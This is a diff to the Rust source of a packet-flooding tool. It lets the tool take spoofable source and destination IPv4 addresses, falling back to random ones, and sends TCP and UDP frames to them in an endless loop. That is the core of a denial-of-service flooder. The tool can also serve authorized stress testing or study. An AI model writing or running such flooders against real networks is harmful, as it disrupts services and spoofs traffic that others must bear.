@@ -1,11 +1,13 @@
 use std::net::Ipv4Addr;
 use rand::{Rng, rngs::ThreadRng};
+use crate::arg_parser::FloodArgs;
 use crate::pkt_kit::{PacketBuilder, PacketSender};
 use crate::utils::{default_ipv4_net, inline_display};
 
 
 
 pub struct PacketFlood {
+    args:      FloodArgs,
     start:     u32,
     end:       u32,
     pkts_sent: usize,
@@ -15,8 +17,9 @@ pub struct PacketFlood {
 
 impl PacketFlood {
 
-    pub fn new() -> Self {
+    pub fn new(args: FloodArgs) -> Self {
         Self {
+            args,
             start:     0,
             end:       0,
             pkts_sent: 0,
@@ -53,19 +56,33 @@ impl PacketFlood {
         let (mut pkt_builder, mut pkt_sender) = Self::setup_tools();
 
         loop {
-            let ip = self.get_random_ip();
+            let src_ip = self.get_src_ip();
+            let dst_ip = self.get_dst_ip();
             
-            let tcp_pkt = pkt_builder.build_tcp_ether_packet(ip);
+            let tcp_pkt = pkt_builder.build_tcp_ether_packet(src_ip, dst_ip);
             pkt_sender.send_layer2_frame(tcp_pkt);
 
-            let udp_pkt = pkt_builder.build_udp_ether_packet(ip);
+            let udp_pkt = pkt_builder.build_udp_ether_packet(src_ip, dst_ip);
             pkt_sender.send_layer2_frame(udp_pkt);
             
             self.display_progress();
         }
     }
 
+
+
+    fn get_src_ip(&mut self) -> Ipv4Addr {
+        self.args.src_ip.unwrap_or_else(|| self.get_random_ip())
+    }
+
+
+
+    fn get_dst_ip(&mut self) -> Ipv4Addr {
+        self.args.dst_ip.unwrap_or_else(|| self.get_random_ip())
+    }
+
     
+
     fn display_progress(&mut self) {
         self.pkts_sent += 2;
         let msg: String = format!("Packets sent: {}", &self.pkts_sent);
